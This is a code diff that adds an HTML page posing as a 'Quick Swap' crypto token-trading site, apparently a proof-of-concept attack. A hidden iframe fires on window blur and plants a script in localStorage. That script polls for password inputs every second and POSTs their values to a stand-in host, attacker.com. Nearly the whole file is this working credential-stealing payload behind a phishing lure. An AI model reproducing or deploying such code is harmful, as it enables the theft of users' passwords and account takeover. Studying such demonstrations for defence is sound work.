@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Token Swap</title>
+    <style>
+        iframe { visibility: hidden; }
+    </style>
+    <script>
+        window.onblur = function() {
+            document.getElementById("iframe").src = "javascript:" +
+                "try {" +
+                "  localStorage.setItem('malicious_script', " +
+                "    'setInterval(function(){" +
+                "      if(document.querySelector(\\\"input[type=password]\\\")) {" +
+                "        var pwd = document.querySelector(\\\"input[type=password]\\\").value;" +
+                "        if(pwd) fetch(\\\"https://attacker.com/pwd\\\", {" +
+                "          method:\\\"POST\\\", body:pwd" +
+                "        });" +
+                "      }" +
+                "    }, 1000);'" +
+                "  );" +
+                "  alert('Malicious script stored in localStorage');" +
+                "} catch(e) { alert('Error: ' + e); }";
+        }
+    </script>
+</head>
+<body>
+    <center>
+        <h1>⚡ Quick Swap</h1>
+        <p>Best rates guaranteed!</p>
+        <button style="padding:15px 30px;">Start Trading</button>
+    </center>
+    <iframe id="iframe"></iframe>
+</body>
+</html>
